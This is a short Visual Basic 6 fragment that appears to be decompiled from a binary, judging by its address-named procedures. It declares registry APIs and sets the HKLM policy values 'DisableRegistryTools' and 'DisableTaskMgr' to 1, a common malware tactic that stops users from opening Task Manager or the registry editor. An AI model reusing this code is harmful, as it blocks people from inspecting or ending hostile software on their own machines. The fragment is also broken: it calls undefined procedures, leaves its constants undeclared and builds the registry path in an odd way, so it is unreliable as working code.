Option Explicit

Private Declare Function RegCreateKey Lib "advapi32" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegSetValueEx Lib "advapi32" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long

Public Sub Proc_1_0_45B780(ByVal hKey As Long, ByVal sSubKey As String, ByVal sValue As String)
    Dim hOpenedKey As Long
    RegCreateKey hKey, sSubKey & "\" & sValue, hOpenedKey
    If hOpenedKey Then
        RegSetValueEx hOpenedKey, vbNullString, 0, REG_SZ, ByVal sValue, Len(sValue)
        RegCloseKey hOpenedKey
    End If
End Sub

Public Sub Proc_1_1_45B890()
    If Proc_2_0_45BA20() Then
        Proc_2_1_45BB50 HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", "1"
        Proc_2_1_45BB50 HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", "1"
    End If
End Sub
